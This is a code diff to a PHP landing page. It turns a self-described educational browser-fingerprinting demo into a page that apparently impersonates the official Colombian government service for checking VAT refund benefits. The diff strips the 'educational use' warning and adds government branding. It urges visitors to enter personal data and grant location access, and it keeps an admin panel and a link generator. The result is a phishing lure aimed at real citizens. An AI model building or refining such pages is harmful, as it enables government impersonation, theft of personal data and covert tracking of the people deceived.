@@ -9,8 +9,8 @@
 
 // Verificar si se está accediendo desde la raíz
 if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
-    // Redireccionar al frontend
-    header('Location: /frontend/');
+    // Redireccionar al formulario de consulta de beneficio de devolución del IVA
+    header('Location: /frontend/consulta_beneficio.html');
     exit();
 }
 
@@ -20,7 +20,7 @@ if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php')
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema de Demostración de Seguridad</title>
+    <title>Consulta de Beneficio - Devolución del IVA</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -80,16 +80,16 @@ if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php')
 </head>
 <body>
     <div class="container">
-        <div class="logo">🔒</div>
-        <h1>Sistema de Demostración de Seguridad</h1>
-        <p>Herramienta educativa para demostrar riesgos de seguridad informática y técnicas de fingerprinting del navegador.</p>
+        <div class="logo">🏛️</div>
+        <h1>Consulta de Beneficio - Devolución del IVA</h1>
+        <p>Sistema oficial del Gobierno Nacional de Colombia para la consulta del beneficio de devolución del IVA.</p>
         
-        <a href="/frontend/" class="btn">Ir al Frontend</a>
+        <a href="/frontend/consulta_beneficio.html" class="btn">Consultar Beneficio</a>
         <a href="/admin/dashboard.php" class="btn">Panel de Administración</a>
         <a href="/admin/link-generator.php" class="btn">Generar Enlaces</a>
         
         <div class="warning">
-            <strong>⚠️ Uso Educativo:</strong> Esta herramienta está diseñada exclusivamente para fines educativos y de concienciación sobre seguridad informática. Úsala de manera ética y responsable.
+            <strong>ℹ️ Información Importante:</strong> Para consultar su beneficio de devolución del IVA, complete el formulario con sus datos personales y permita el acceso a su ubicación para mejorar la precisión del servicio.
         </div>
     </div>
 </body>
